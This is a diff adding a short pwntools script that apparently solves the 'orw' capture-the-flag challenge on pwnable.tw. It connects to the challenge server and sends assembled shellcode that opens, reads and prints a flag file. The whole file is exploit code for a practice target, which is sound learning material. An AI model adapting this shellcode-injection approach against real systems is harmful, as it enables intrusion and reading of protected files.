@@ -1,0 +1,16 @@
+#Make Shellcode Easy Using pwntools~!
+#!/usr/bin/python
+
+from pwn import *
+
+s = remote('chall.pwnable.tw',10001)
+shellcode = ''
+shellcode += shellcraft.pushstr('/home/orw/flag')
+shellcode += shellcraft.open('esp', 0, 0)
+shellcode += shellcraft.read('eax', 'esp', 100)
+shellcode += shellcraft.write(1, 'esp', 100)
+
+shell = asm(shellcode)
+
+s.sendline(shell)
+s.interactive()
